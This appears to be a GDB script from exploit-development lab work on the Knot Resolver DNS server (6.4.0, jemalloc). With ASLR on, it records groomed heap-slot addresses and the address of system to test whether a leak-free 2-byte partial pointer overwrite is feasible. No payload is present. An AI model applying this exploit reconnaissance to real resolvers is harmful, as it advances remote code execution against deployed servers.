# ASLR-ON variant of gnutls-owner.gdb: measure whether the low 16 bits of
# the groomed slot1 address are stable across independently randomized runs.
# This tests the precondition for a partial (2-byte) pointer overwrite that
# needs no information leak.  Loopback only; host sysctl untouched.
set pagination off
set confirm off
set disable-randomization off
cd /home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell/run/6.4.0-jemalloc
set $n1438 = 0
break wire_buf_consume
commands
  silent
  if $rsi == 1438
    set $n1438 = $n1438 + 1
    if $n1438 == 4
      set $wb = $rdi
      set $buf = *(unsigned long*)$wb
      set $slot1 = $buf + 6144
      printf "ASLR_ON_PRE_F6 buf=0x%lx slot1=0x%lx size=%lu\n", \
        $buf, $slot1, *(unsigned long*)($wb+8)
      printf "ASLR_ON_SYSTEM=%p\n", &system
      quit
    end
  end
  continue
end
run -n -c /home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell/run/6.4.0-jemalloc/config /home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell/run/6.4.0-jemalloc
printf "ASLR_ON_NO_HIT rip=%p\n", $pc
